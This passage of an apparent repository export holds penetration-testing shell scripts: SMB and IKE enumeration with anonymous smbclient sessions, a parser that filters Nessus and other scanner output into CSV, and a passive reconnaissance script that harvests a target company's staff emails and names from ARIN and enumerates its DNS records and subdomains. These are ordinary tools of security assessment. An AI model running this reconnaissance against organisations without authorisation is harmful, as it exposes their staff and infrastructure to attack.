\"$NAME\"/script-enum4linux.txt\n            enum4linux -a \"$LINE\" >> \"$NAME\"/script-enum4linux.txt 2>/dev/null\n            echo >> \"$NAME\"/script-enum4linux.txt\n        done < \"$NAME\"/445.txt\n\n        echo \"    smbclient\"\n        while read -r LINE; do\n            echo \"$LINE\" >> \"$NAME\"/script-smbclient.txt\n            smbclient -L \"$LINE\" -N | grep -Eiv '(disabled|failed)' >> \"$NAME\"/script-smbclient.txt 2>/dev/null\n            echo >> \"$NAME\"/script-smbclient.txt\n        done < \"$NAME\"/445.txt\n    fi\n\n    if [ -f \"$NAME\"/500.txt ]; then\n        echo \"    ike-scan\"\n        while read -r LINE; do\n                ike-scan -f \"$LINE\" >> \"$NAME\"/script-ike-scan.txt\n        done < \"$NAME\"/445.txt\n    fi\n\n    rm tmp 2>/dev/null\nfi\n"
        },
        {
          "name": "parse.sh",
          "type": "blob",
          "size": 22.9775390625,
          "content": "#!/usr/bin/env bash\n\nclear\nf_banner\n\necho -e \"${BLUE}Parse XML to CSV.${NC}\"\necho\necho \"1.  Burp (Base64)\"\necho \"2.  Nessus (.nessus)\"\necho \"3.  Nexpose (XML 2.0)\"\necho \"4.  Nmap\"\necho \"5.  Qualys\"\necho \"6.  Previous menu\"\necho\necho -n \"Choice: \"\nread -r CHOICE\n\ncase \"$CHOICE\" in\n    1)\n    f_location\n    \"$DISCOVER\"/parsers/parse-burp.py \"$LOCATION\"\n\n    mv burp.csv \"$HOME\"/data/burp-`date +%H:%M:%S`.csv\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/burp-`date +%H:%M:%S`.csv${NC}\\n\"\n    echo\n    echo\n    ;;\n\n    2)\n    f_location\n    \"$DISCOVER\"/parsers/parse-nessus.py \"$LOCATION\"\n\n    # Delete findings with a solution of n/a\n    grep -v 'n/a' nessus.csv > tmp.csv\n    # Delete findings with CVSS score of 0 and solution of n/a\n    grep -Eiv \"(Adobe Acrobat Detection|Adobe Extension Manager Installed|Adobe Flash Player for Mac Installed|Adobe Flash Professional Detection|Adobe Illustrator Detection|Adobe Photoshop Detection|Adobe Reader Detection|Adobe Reader Installed \\(Mac OS X\\)|ADSI Settings|Advanced Message Queuing Protocol Detection|AJP Connector Detection|AirWatch API Settings|Antivirus Software Check|Apache Axis2 Detection|Apache HTTP Server HttpOnly Cookie Information Disclosure|Apple Filing Protocol Server Detection|Apple Profile Manager API Settings|AppSocket & socketAPI Printers - Do Not Scan|Appweb HTTP Server Version|ASG-Sentry SNMP Agent Detection|Authenticated Check: OS Name and Installed Package Enumeration|Autodesk AutoCAD Detection|Backported Security Patch Detection \\(FTP\\)|Backported Security Patch Detection \\(SSH\\)|Authenticated Check: OS Name and Installed Package Enumeration|Backported Security Patch Detection \\(WWW\\)|BACnet Protocol Detection|BIOS Version Information \\(via SMB\\)|BIOS Version \\(WMI\\)|Blackboard Learn Detection|Broken Web Servers|CA Message Queuing Service Detection|CDE Subprocess Control Service \\(dtspcd\\) Detection|Check Point FireWall-1 ICA Service Detection|Check Point SecuRemote Hostname Information Disclosure|Cisco AnyConnect Secure Mobility Client Detection|CISCO ASA SSL VPN Detection|Cisco TelePresence Multipoint Control Unit Detection|Cleartext protocols settings|COM+ Internet Services (CIS) Server Detection|Common Platform Enumeration \\(CPE\\)|Computer Manufacturer Information \\(WMI\\)|CORBA IIOP Listener Detection|Database settings|DB2 Administration Server Detection|DB2 Discovery Service Detection|DCE Services Enumeration|Dell OpenManage Web Server Detection|Derby Network Server Detection|Detect RPC over TCP|Device Hostname|Device Type|DNS Sender Policy Framework \\(SPF\\) Enabled|DNS Server DNSSEC Aware Resolver|DNS Server Fingerprinting|DNS Server Version Detection|Do not scan fragile devices|EMC SMARTS Application Server Detection|Erlang Port Mapper Daemon Detection|Ethernet Card Manufacturer Detection|External URLs|FileZilla Client Installed|firefox Installed \\(Mac OS X\\)|Firewall Rule Enumeration|Flash Player Detection|FTP Service AUTH TLS Command Support|FTP Server Detection|Global variable settings|Good MDM Settings|Google Chrome Detection \\(Windows\\)|Google Chrome Installed \\(Mac OS X\\)|Google Picasa Detection \\(Windows\\)|Host Fully Qualified Domain Name \\(FQDN\\) Resolution|HMAP Web Server Fingerprinting|Hosts File Whitelisted Entries|HP Data Protector Components Version Detection|HP OpenView BBC Service Detection|HP SiteScope Detection|HSTS Missing From HTTPS Server|HTTP cookies import|HTTP Cookie 'secure' Property Transport Mismatch|HTTP login page|HTTP Methods Allowed \\(per directory\\)|HTTP Proxy Open Relay Detection|HTTP Reverse Proxy Detection|HTTP Server Cookies Set|HTTP Server Type and Version|HTTP TRACE \\/ TRACK Methods Allowed|HTTP X-Frame-Options Response Header Usage|Hyper-V Virtual Machine Detection|HyperText Transfer Protocol \\(HTTP\\) Information|IBM Domino Detection \\(uncredentialed check\\)|IBM Domino Installed|IBM GSKit Installed|IBM iSeries Credentials|IBM Lotus Notes Detection|IBM Notes Client Detection|IBM Remote Supervisor Adapter Detection \\(HTTP\\)|IBM Tivoli Endpoint Manager Client Detection|IBM Tivoli Endpoint Manager Web Server Detection|IBM Tivoli Storage Manager Client Installed|IBM Tivoli Storage Manager Service Detection|IBM WebSphere Application Server Detection|IMAP Service Banner Retrieval|IMAP Service STARTTLS Command Support|IP Protocols Scan|IPMI Cipher Suites Supported|IPMI Versions Supported|iTunes Version Detection \\(credentialed check\\)|Kerberos configuration|Kerberos Information Disclosure|L2TP Network Server Detection|LDAP Server Detection|LDAP Crafted Search Request Server Information Disclosure|LDAP Service STARTTLS Command Support|LibreOffice Detection|Login configurations|Lotus Sametime Detection|MacOSX Cisco AnyConnect Secure Mobility Client Detection|McAfee Common Management Agent Detection|McAfee Common Management Agent Installation Detection|McAfee ePolicy Orchestrator Application Server Detection|MediaWiki Detection|Microsoft Exchange Installed|Microsoft Internet Explorer Enhanced Security Configuration Detection|Microsoft Internet Explorer Version Detection|Microsoft Lync Server Installed|Microsoft Malicious Software Removal Tool Installed|Microsoft .NET Framework Detection|Microsoft .NET Handlers Enumeration|Microsoft Office Detection|Microsoft OneNote Detection|Microsoft Patch Bulletin Feasibility Check|Microsoft Revoked Digital Certificates Enumeration|Microsoft Silverlight Detection|Microsoft Silverlight Installed \\(Mac OS X\\)|Microsoft SQL Server STARTTLS Support|Microsoft SMS\\/SCCM Installed|Microsoft System Center Configuration Manager Client Installed|Microsoft System Center Operations Manager Component Installed|Microsoft Update Installed|Microsoft Windows AutoRuns Boot Execute|Microsoft Windows AutoRuns Codecs|Microsoft Windows AutoRuns Explorer|Microsoft Windows AutoRuns Internet Explorer|Microsoft Windows AutoRuns Known DLLs|Microsoft Windows AutoRuns Logon|Microsoft Windows AutoRuns LSA Providers|Microsoft Windows AutoRuns Network Providers|Microsoft Windows AutoRuns Print Monitor|Microsoft Windows AutoRuns Registry Hijack Possible Locations|Microsoft Windows AutoRuns Report|Microsoft Windows AutoRuns Scheduled Tasks|Microsoft Windows AutoRuns Services and Drivers|Microsoft Windows AutoRuns Unique Entries|Microsoft Windows AutoRuns Winlogon|Microsoft Windows AutoRuns Winsock Provider|Microsoft Windows 'CWDIllegalInDllSearch' Registry Setting|Microsoft Windows Installed Hotfixes|Microsoft Windows NTLMSSP Authentication Request Remote Network Name Disclosure|Microsoft Windows Process Module Information|Microsoft Windows Process Unique Process Name|Microsoft Windows Remote Listeners Enumeration \\(WMI\\)|Microsoft Windows SMB : Obtains the Password Policy|Microsoft Windows SMB LanMan Pipe Server Listing Disclosure|Microsoft Windows SMB Log In Possible|Microsoft Windows SMB LsaQueryInformationPolicy Function NULL Session Domain SID Enumeration|Microsoft Windows SMB NativeLanManager Remote System Information Disclosure|Microsoft Windows SMB Registry : Enumerate the list of SNMP communities|Microsoft Windows SMB Registry : Nessus Cannot Access the Windows Registry|Microsoft Windows SMB Registry : OS Version and Processor Architecture|Microsoft Windows SMB Registry : Remote PDC\\/BDC Detection|Microsoft Windows SMB Versions Supported|Microsoft Windows SMB Registry : Vista \\/ Server 2008 Service Pack Detection|Microsoft Windows SMB Registry : XP Service Pack Detection|Microsoft Windows SMB Registry Remotely Accessible|Microsoft Windows SMB Registry : Win 7 \\/ Server 2008 R2 Service Pack Detection|Microsoft Windows SMB Registry : Windows 2000 Service Pack Detection|Microsoft Windows SMB Registry : Windows 2003 Server Service Pack Detection|Microsoft Windows SMB Service Detection|Microsoft Windows Update Installed|MobileIron API Settings|MSRPC Service Detection|Modem Enumeration \\(WMI\\)|MongoDB Settings|Mozilla Foundation Application Detection|MySQL Server Detection|Nessus Internal: Put cgibin in the KB|Nessus Scan Information|Nessus SNMP Scanner|NetBIOS Multiple IP Address Enumeration|Netstat Active Connections|Netstat Connection Information|netstat portscanner \\(SSH\\)|Netstat Portscanner \\(WMI\\)|Network Interfaces Enumeration \\(WMI\\)|Network Time Protocol \\(NTP\\) Server Detection|Nmap \\(XML file importer\\)|Non-compliant Strict Transport Security (STS)|OpenSSL Detection|OpenSSL Version Detection|Oracle Application Express \\(Apex\\) Detection|Oracle Application Express \\(Apex\\) Version Detection|Oracle Java Runtime Environment \\(JRE\\) Detection \\(Unix\\)|Oracle Java Runtime Environment \\(JRE\\) Detection|Oracle Installed Software Enumeration \\(Windows\\)|Oracle Settings|OS Identification|Palo Alto Networks PAN-OS Settings|Patch Management: Dell KACE K1000 Settings|Patch Management: IBM Tivoli Endpoint Manager Server Settings|Patch Management: Patch Schedule From Red Hat Satellite Server|Patch Management: Red Hat Satellite Server Get Installed Packages|Patch Management: Red Hat Satellite Server Get Managed Servers|Patch Management: Red Hat Satellite Server Get System Information|Patch Management: Red Hat Satellite Server Settings|Patch Management: SCCM Server Settings|Patch Management: Symantec Altiris Settings|Patch Management: VMware Go Server Settings|Patch Management: WSUS Server Settings|PCI DSS compliance : options settings|PHP Version|Ping the remote host|POP3 Service STLS Command Support|Port scanner dependency|Port scanners settings|Post-Scan Rules Application|Post-Scan Status|Protected Web Page Detection|RADIUS Server Detection|RDP Screenshot|RealPlayer Detection|Record Route|Remote listeners enumeration \\(Linux \\/ AIX\\)|Remote web server screenshot|Reputation of Windows Executables: Known Process\\(es\\)|Reputation of Windows Executables: Unknown Process\\(es\\)|RHEV Settings|RIP Detection|RMI Registry Detection|RPC portmapper \\(TCP\\)|RPC portmapper Service Detection|RPC Services Enumeration|Salesforce.com Settings|Samba Server Detection|SAP Dynamic Information and Action Gateway Detection|SAProuter Detection|Service Detection \\(GET request\\)|Service Detection \\(HELP Request\\)|slident \\/ fake identd Detection|Service Detection \\(2nd Pass\\)|Service Detection: 3 ASCII Digit Code Responses|SMB : Disable the C$ and ADMIN$ shares after the scan (WMI)|SMB : Enable the C$ and ADMIN$ shares during the scan \\(WMI\\)|SMB Registry : Start the Registry Service during the scan|SMB Registry : Start the Registry Service during the scan \\(WMI\\)|SMB Registry : Starting the Registry Service during the scan failed|SMB Registry : Stop the Registry Service after the scan|SMB Registry : Stop the Registry Service after the scan \\(WMI\\)|SMB Registry : Stopping the Registry Service after the scan failed|SMB QuickFixEngineering \\(QFE\\) Enumeration|SMB Scope|SMTP Server Connection Check|SMTP Service STARTTLS Command Support|SMTP settings|smtpscan SMTP Fingerprinting|Snagit Installed|SNMP settings|SNMP Supported Protocols Detection|SNMPc Management Server Detection|SOCKS Server Detection|SolarWinds TFTP Server Installed|Spybot Search & Destroy Detection|SquirrelMail Detection|SSH Algorithms and Languages Supported|SSH Protocol Versions Supported|SSH Server Type and Version Information|SSH settings|SSL \\/ TLS Versions Supported|SSL Certificate Information|SSL Cipher Block Chaining Cipher Suites Supported|SSL Cipher Suites Supported|SSL Compression Methods Supported|SSL Perfect Forward Secrecy Cipher Suites Supported|SSL Resume With Different Cipher Issue|SSL Service Requests Client Certificate|SSL Session Resume Supported|SSL\\/TLS Service Requires Client Certificate|Strict Transport Security \\(STS\\) Detection|Subversion Client/Server Detection \\(Windows\\)|Symantec Backup Exec Server \\/ System Recovery Installed|Symantec Encryption Desktop Installed|Symantec Endpoint Protection Manager Installed \\(credentialed check\\)|Symantec Veritas Enterprise Administrator Service \\(vxsvc\\) Detection|TCP\\/IP Timestamps Supported|TeamViewer Version Detection|Tenable Appliance Check \\(deprecated\\)|Terminal Services Use SSL\\/TLS|Thunderbird Installed \\(Mac OS X\\)|Time of Last System Startup|TLS Next Protocols Supported|TLS NPN Supported Protocol Enumeration|Traceroute Information|Unknown Service Detection: Banner Retrieval|UPnP Client Detection|VERITAS Backup Agent Detection|VERITAS NetBackup Agent Detection|Viscosity VPN Client Detection \\(Mac OS X\\)|VMware vCenter Detect|VMware vCenter Orchestrator Installed|VMware ESX\\/GSX Server detection|VMware SOAP API Settings|VMware vCenter SOAP API Settings|VMware Virtual Machine Detection|VMware vSphere Client Installed|VMware vSphere Detect|VNC Server Security Type Detection|VNC Server Unencrypted Communication Detection|vsftpd Detection|Wake-on-LAN|Web Application Firewall Detection|Web Application Tests Settings|Web mirroring|Web Server Directory Enumeration|Web Server Harvested Email Addresses|Web Server HTTP Header Internal IP Disclosure|Web Server Load Balancer Detection|Web Server No 404 Error Code Check|Web Server robots.txt Information Disclosure|Web Server UDDI Detection|Window Process Information|Window Process Module Information|Window Process Unique Process Name|Windows Compliance Checks|Windows ComputerSystemProduct Enumeration \\(WMI\\)|Windows Display Driver Enumeration|Windows DNS Server Enumeration|Windows Management Instrumentation \\(WMI\\) Available|Windows NetBIOS \\/ SMB Remote Host Information Disclosure|Windows Prefetch Folder|Windows Product Key Retrieval|WinSCP Installed|Wireless Access Point Detection|Wireshark \\/ Ethereal Detection \\(Windows\\)|WinZip Installed|WMI Anti-spyware Enumeration|WMI Antivirus Enumeration|WMI Bluetooth Network Adapter Enumeration|WMI Encryptable Volume Enumeration|WMI Firewall Enumeration|WMI QuickFixEngineering \\(QFE\\) Enumeration|WMI Server Feature Enumeration|WMI Trusted Platform Module Enumeration|Yosemite Backup Service Driver Detection|ZENworks Remote Management Agent Detection)\" nessus.csv > tmp.csv\n\n    # Delete additional findings with CVSS score of 0\n    grep -Eiv \"(Acronis Agent Detection \\(TCP\\)|Acronis Agent Detection \\(UDP\\)|Additional DNS Hostnames|Adobe AIR Detection|Adobe Reader Enabled in Browser \\(Internet Explorer\\)|Adobe Reader Enabled in Browser \\(Mozilla firefox\\)|Alert Standard Format \\/ Remote Management and Control Protocol Detection|Amazon Web Services Settings|Apache Banner Linux Distribution Disclosure|Apache Tomcat Default Error Page Version Detection|Apple TV Detection|Apple TV Version Detection|Authentication Failure - Local Checks Not Run|CA ARCServe UniversalAgent Detection|CA BrightStor ARCserve Backup Discovery Service Detection|Citrix Licensing Service Detection|Citrix Server Detection|COM+ Internet Services \\(CIS\\) Server Detection|Crystal Reports Central Management Server Detection|Data Execution Prevention \\(DEP\\) is Disabled|Daytime Service Detection|DB2 Connection Port Detection|Discard Service Detection|DNS Server BIND version Directive Remote Version Disclosure|DNS Server Detection|DNS Server hostname.bind Map Hostname Disclosure|Do not scan Novell NetWare|Do not scan printers|Do not scan printers \\(AppSocket\\)|Dropbox Installed \\(Mac OS X\\)|Dropbox Software Detection \\(uncredentialed check\\)|Enumerate IPv4 Interfaces via SSH|Echo Service Detection|EMC Replication Manager Client Detection|Enumerate IPv6 Interfaces via SSH|Enumerate MAC Addresses via SSH|Exclude top-level domain wildcard hosts|H323 Protocol \\/ VoIP Application Detection|Host Authentication Failure\\(s\\) for Provided Credentials|HP LoadRunner Agent Service Detection|HP Integrated Lights-Out \\(iLO\\) Detection|IBM Tivoli Storage Manager Client Acceptor Daemon Detection|IBM WebSphere MQ Listener Detection|ICMP Timestamp Request Remote Date Disclosure|Identd Service Detection|Inconsistent Hostname and IP Address|Ingres Communications Server Detection|Internet Cache Protocol \\(ICP\\) Version 2 Detection|IPSEC Internet Key Exchange \\(IKE\\) Detection|IPSEC Internet Key Exchange \\(IKE\\) Version 1 Detection|iTunes Music Sharing Enabled|iTunes Version Detection \\(Mac OS X\\)|JavaScript Enabled in Adobe Reader|IPSEC Internet Key Exchange \\(IKE\\) Version 2 Detection|iSCSI Target Detection|LANDesk Ping Discovery Service Detection|Link-Local Multicast Name Resolution \\(LLMNR\\) Detection|LPD Detection|mDNS Detection \\(Local Network\\)|Microsoft IIS 404 Response Service Pack Signature|Microsoft SharePoint Server Detection|Microsoft SQL Server Detection \\(credentialed check\\)|Microsoft SQL Server TCP\\/IP Listener Detection|Microsoft SQL Server UDP Query Remote Version Disclosure|Microsoft Windows Installed Software Enumeration \\(credentialed check\\)|Microsoft Windows Messenger Detection|Microsoft Windows Mounted Devices|Microsoft Windows Security Center Settings|Microsoft Windows SMB Fully Accessible Registry Detection|Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration|Microsoft Windows SMB Registry Not Fully Accessible Detection|Microsoft Windows SMB Share Hosting Possibly Copyrighted Material|Microsoft Windows SMB : WSUS Client Configured|Microsoft Windows Startup Software Enumeration|Microsoft Windows Summary of Missing Patches|NIS Server Detection|Nessus SYN scanner|Nessus TCP scanner|Nessus UDP scanner|Nessus Windows Scan Not Performed with Admin Privileges|Netscape Enterprise Server Default Files Present|NetVault Process Manager Service Detection|NFS Server Superfluous|News Server \\(NNTP\\) Information Disclosure|NNTP Authentication Methods|OEJP Daemon Detection|Open Port Re-check|OpenVAS Manager \\/ Administrator Detection|Oracle Database Detection|Oracle Database tnslsnr Service Remote Version Disclosure|Oracle Java JRE Enabled \\(Google Chrome\\)|Oracle Java JRE Enabled \\(Internet Explorer\\)|Oracle Java JRE Enabled \\(Mozilla firefox\\)|Oracle Java JRE Premier Support and Extended Support Version Detection|Oracle Java JRE Universally Enabled|Panda AdminSecure Communications Agent Detection|Patch Report|PCI DSS compliance : Insecure Communication Has Been Detected|Pervasive PSQL \\/ Btrieve Server Detection|OSSIM Server Detection|POP Server Detection|PostgreSQL Server Detection|PPTP Detection|QuickTime for Windows Detection|Quote of the Day \\(QOTD\\) Service Detection|Reverse NAT\\/Intercepting Proxy Detection|RMI Remote Object Detection|RPC rstatd Service Detection|rsync Service Detection|RTMP Server Detection|RTSP Server Type \\/ Version Detection|Session Initiation Protocol Detection|SFTP Supported|Skype Detection|Skype for Mac Installed \\(credentialed check\\)|Skype Stack Version Detection|SLP Server Detection \\(TCP\\)|SLP Server Detection \\(UDP\\)|SMTP Authentication Methods|SMTP Server Detection|SNMP Protocol Version Detection|SNMP Query Installed Software Disclosure|SNMP Query Routing Information Disclosure|SNMP Query Running Process List Disclosure|SNMP Query System Information Disclosure|SNMP Request Network Interfaces Enumeration|Software Enumeration \\(SSH\\)|SSL Root Certification Authority Certificate Information|SSL Certificate Chain Contains Certificates Expiring Soon|SSL Certificate Chain Contains RSA Keys Less Than 2048 bits|SSL Certificate Chain Contains Unnecessary Certificates|SSL Certificate Chain Not Sorted|SSL Certificate 'commonName' Mismatch|SSL Certificate Expiry - Future Expiry|SuperServer Detection|Symantec pcAnywhere Detection \\(TCP\\)|Symantec pcAnywhere Status Service Detection \\(UDP\\)|TCP Channel Detection|Telnet Server Detection|TFTP Daemon Detection|Universal Plug and Play \\(UPnP\\) Protocol Detection|Unix Operating System on Extended Support|USB Drives Enumeration \\(WMI\\)|VMware Fusion Version Detection \\(Mac OS X\\)|WebDAV Detection|Web Server \\/ Application favicon.ico Vendor Fingerprinting|Web Server Crafted Request Vendor/Version Information Disclosure|Web Server on Extended Support|Web Server SSL Port HTTP Traffic Detection|Web Server Unconfigured - Default Install Page Present|Web Server UPnP Detection|Windows Terminal Services Enabled|WINS Server Detection|X Font Service Detection)\" tmp.csv > tmp2.csv\n\n    # Delete additional findings.\n    grep -Eiv '(dhcp server detection|mdns detection \\(remote network\\))' tmp2.csv > tmp3.csv\n\n    # Clean up\n    cat tmp3.csv | sed 's/Algorithm :/Algorithm:/g; s/are :/are:/g; s/authorities :/authorities:/g; s/authority :/authority:/g; s/Banner         :/Banner:/g; s/ (banner check)//; s/before :/before/g; s/combinations :/combinations:/g; s/ (credentialed check)//; s/expired :/expired:/g; s/Here is the list of medium strength SSL ciphers supported by the remote server: Medium Strength Ciphers //g; s/httpOnly/HttpOnly/g; s/ (intrusive check)//g; s/is :/is:/g; s/P   /P /g; s/Issuer         :/Issuer:/g; s/Issuer  :/Issuer:/g; s/List of 64-bit block cipher suites supported by the remote server: Medium Strength Ciphers //g; s/Nessus collected the following banner from the remote Telnet server:  //g; s/ (remote check)//; s/ (safe check)//; s/server :/server:/g; s/Service Pack /SP/g; s/Source          :/Source:/g; s/source    :/source:/g; s/Subject        :/Subject:/g; s/Subject :/Subject:/g; s/supported :/supported:/g; s/The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority:  |-//g; s/The following certificate was found at the top of the certificate chain sent by the remote host, but is self-signed and was not found in the list of known certificate authorities:  |-//g; s/The following certificate was part of the certificate chain sent by the remote host, but it has expired :  |-//g; s/The following certificates were part of the certificate chain sent by the remote host, but they have expired :  |-//g; s/The following certificates were part of the certificate chain sent by the remote host, but contain hashes that are considered to be weak.  |-//g; s/The identities known by Nessus are: //g; s/ (uncredentialed check)//g; s/ (version check)//g; s/()//g; s/(un)//g; s/users :/users:/g; s/version    :/version:/g; s/version    :/version:/g; s/version  :/version:/g; s/version :/version:/g; s/           :/:/g; s/:    /: /g; s/:    /: /g; s/\"   /\"/g; s/\"  /\"/g; s/\" /\"/g; s/\"h/\" h/g; s/.   /. /g' > \"$HOME\"/data/nessus-`date +%H:%M:%S`.csv\n\n    rm nessus* tmp*\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/nessus-`date +%H:%M:%S`.csv${NC}\\n\"\n    echo\n    echo\n    ;;\n\n    3)\n    f_location\n    \"$DISCOVER\"/parsers/parse-nexpose.py \"$LOCATION\"\n\n    mv nexpose.csv \"$HOME\"/data/nexpose-`date +%H:%M:%S`.csv\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/nexpose-`date +%H:%M:%S`.csv${NC}\\n\"\n    echo\n    echo\n    ;;\n\n    4)\n    f_location\n    cp \"$LOCATION\" ./nmap.xml\n    \"$DISCOVER\"/parsers/parse-nmap.py\n    mv nmap.csv \"$HOME\"/data/nmap-`date +%H:%M:%S`.csv\n    rm nmap.xml\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/nmap-`date +%H:%M:%S`.csv${NC}\\n\"\n    echo\n    echo\n    ;;\n\n    5)\n    f_location\n    echo\n    echo \"[!] This will take about 2.5 mins, be patient.\"\n    echo\n\n    \"$DISCOVER\"/parsers/parse-qualys.py \"$LOCATION\"\n    mv qualys.csv \"$HOME\"/data/qualys-`date +%H:%M:%S`.csv\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/qualys-`date +%H:%M:%S`.csv${NC}\\n\"\n    echo\n    echo\n    ;;\n\n    6) f_main ;;\n    *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/parse.sh ;;\nesac\n"
        },
        {
          "name": "parsers",
          "type": "tree",
          "content": null
        },
        {
          "name": "passive.sh",
          "type": "blob",
          "size": 29.1845703125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Check for root\nif [ $EUID -eq 0 ]; then\n    echo\n    echo \"[!] This script cannot be ran as root.\"\n    echo\n    exit 1\nfi\n\nf_terminate() {\n    SAVE_DIR=$HOME/data/cancelled-$(date +%H:%M:%S)\n    echo\n    echo \"[!] Terminating.\"\n    echo\n    echo -e \"${YELLOW}Saving data to $SAVE_DIR.${NC}\"\n\n    cd \"$DISCOVER\"\n    mv \"$HOME\"/data/\"$DOMAIN\" \"$SAVE_DIR\" 2>/dev/null\n    mv emails hosts names records squatting subdomains tmp* whois* z* doc pdf ppt txt xls \"$SAVE_DIR\" 2>/dev/null\n\n    echo\n    echo \"[*] Saving complete.\"\n    echo\n    exit 1\n}\n\n# Catch process termination\ntrap f_terminate SIGHUP SIGINT SIGTERM\n\nclear\nf_banner\n\n# Check if Firefox is running\nif pgrep firefox > /dev/null; then\n    echo\n    echo \"[!] Close Firefox before running script.\"\n    echo\n    exit 1\nfi\n\necho -e \"${BLUE}Uses ARIN, DNSRecon, dnstwist, subfinder, sublist3r,${NC}\"\necho -e \"${BLUE}theHarvester, Metasploit, Whois, and multiple websites.${NC}\"\necho\necho -e \"${BLUE}[*] Acquire API keys for maximum results with theHarvester.${NC}\"\necho -e \"${BLUE}[*] Add keys to /root/.theHarvester/api-keys.yaml${NC}\"\necho\necho \"$MEDIUM\"\necho\necho \"Usage\"\necho\necho \"Company: Target\"\necho \"Domain:  target.com\"\necho\necho \"$MEDIUM\"\necho\necho -n \"Company: \"\nread -r COMPANY\n\n# Check for no answer, need dbl brackets to handle a space in the name\nif [[ -z \"$COMPANY\" ]]; then\n    f_error\nfi\n\necho -n \"Domain:  \"\nread -r DOMAIN\n\n# Check for no answer\nif [ -z \"$DOMAIN\" ]; then\n    f_error\nfi\n\n# Check for a valid domain\nif [[ ! \"$DOMAIN\" =~ ^([a-zA-Z0-9](-?[a-zA-Z0-9])*\\.)+[a-zA-Z]{2,63}$ ]]; then\n    echo\n    echo -e \"${RED}$SMALL${NC}\"\n    echo\n    echo -e \"${RED}[!] Invalid domain.${NC}\"\n    echo\n    echo -e \"${RED}$SMALL${NC}\"\n    echo\n    exit 1\nfi\n\nCOMPANYURL=$( printf \"%s\\n\" \"$COMPANY\" | sed 's/ /%20/g; s/\\&/%26/g; s/\\,/%2C/g' )\n\ncp -R \"$DISCOVER\"/report/ \"$HOME\"/data/\"$DOMAIN\"\nsed -i \"s/#COMPANY#/$COMPANY/\" \"$HOME\"/data/\"$DOMAIN\"/index.htm\nsed -i \"s/#DOMAIN#/$DOMAIN/\" \"$HOME\"/data/\"$DOMAIN\"/index.htm\nsed -i \"s/#DATE#/$RUNDATE/\" \"$HOME\"/data/\"$DOMAIN\"/index.htm\n\necho\necho \"$MEDIUM\"\necho\n\n###############################################################################################################################\n\n# Number of tests\nTOTAL=41\n\necho \"ARIN\"\necho \"    Email                (1/$TOTAL)\"\n\n# Fetch ARIN data\nif ! curl -ks \"https://whois.arin.net/rest/pocs;domain=$DOMAIN\" -o tmp.xml; then\n    echo\n    echo \"[!] Failed to fetch ARIN data.\"\n    echo\nfi\n\n# Check for results in the XML file\nif ! grep -q 'No Search Results' tmp.xml; then\n    # Extract handles and URLs\n    xmllint --format tmp.xml | grep 'handle' | cut -d '>' -f2 | cut -d '<' -f1 | sort -u > zurls.txt\n    xmllint --format tmp.xml | grep 'handle' | cut -d '\"' -f2 | sort -u > zhandles.txt\n\n    # Process each URL for email extraction\n    while read -r LINE; do\n        curl -k -s \"$LINE\" > tmp2.xml\n        xml_grep 'email' tmp2.xml --text_only >> tmp\n    done < zurls.txt\n\n    # Filter and format emails\n    grep -v '_' tmp | tr 'A-Z' 'a-z' | sort -u > zarin-emails\nfi\n\n# Cleanup temporary files\nrm tmp* zurls.txt 2>/dev/null\n\n###############################################################################################################################\n\necho \"    Names                (2/$TOTAL)\"\nif [ -f zhandles.txt ]; then\n    while read -r LINE; do\n        curl -ks \"https://whois.arin.net/rest/poc/$LINE.txt\" | grep 'Name' >> tmp\n    done < zhandles.txt\n\n    # Process names\n    grep -Eiv \"($COMPANY|@|abuse|center|domainnames|helpdesk|hostmaster|network|support|technical|telecom)\" tmp > tmp2\n    sed 's/Name:           //g' tmp2 | tr 'A-Z' 'a-z' | sed 's/\\b\\(.\\)/\\u\\1/g' > tmp3\n    awk -F\", \" '{print $2,$1}' tmp3 | sed 's/  / /g' | sort -u > zarin-names\nfi\n\n# Cleanup temporary files\nrm tmp* zhandles.txt 2>/dev/null\necho\n\n###############################################################################################################################\n\necho \"DNSRecon                 (3/$TOTAL)\"\ndnsrecon -d \"$DOMAIN\" -n 8.8.8.8 -t std > tmp 2>/dev/null\ngrep -Eiv '(all queries will|could not|dnskeys|dnssec|error|it is resolving|nsec3|performing|records|recursion|txt|version|wildcard resolution)' tmp | sed 's/\\[\\*\\]//g; s/\\[+\\]//g; s/^[ \\t]*//' | column -t | sort | sed 's/[ \\t]*$//' > records\ngrep 'TXT' tmp | sed 's/\\[\\*\\]//g; s/\\[+\\]//g; s/^[ \\t]*//' | sort | sed 's/[ \\t]*$//' >> records\n\ncat records >> \"$HOME\"/data/\"$DOMAIN\"/data/records.htm\necho \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/records.htm\n\n# Cleanup temporary file\nrm tmp 2>/dev/null\necho\n\n###############################################################################################################################\n\necho \"dnstwist                 (4/$TOTAL)\"\ndnstwist --registered \"$DOMAIN\" > tmp\nsed -E 's/\\b([0-9a-fA-F]{1,4}:){1,7}[0-9a-fA-F]{1,4}\\b//g' tmp | grep -v 'original' | sed 's/!ServFail/        /g; s/MX:$//g; s/MX:localhost//g; s/[ \\t]*$//' | column -t | sed 's/[ \\t]*$//' | sed -E 's/([0-9a-fA-F]{1,4}:){1,7}[0-9a-fA-F]{1,4}/ /g' | sed 's/::28f//g; s/::28//g; s/::2e1//g; s/::200//g; s/:://g' > squatting\necho\n\n###############################################################################################################################\n\necho \"subfinder                (5/$TOTAL)\"\n/opt/subfinder/v2/cmd/subfinder/subfinder -d \"$DOMAIN\" -silent | sort -u > zsubfinder\necho\n\n###############################################################################################################################\n\necho \"sublist3r                (6/$TOTAL)\"\nsublist3r -d \"$DOMAIN\" > tmp 2>/dev/null\nsed 's/\\x1B\\[[0-9;]*m//g' tmp | sed '/^ /d' | grep -Eiv 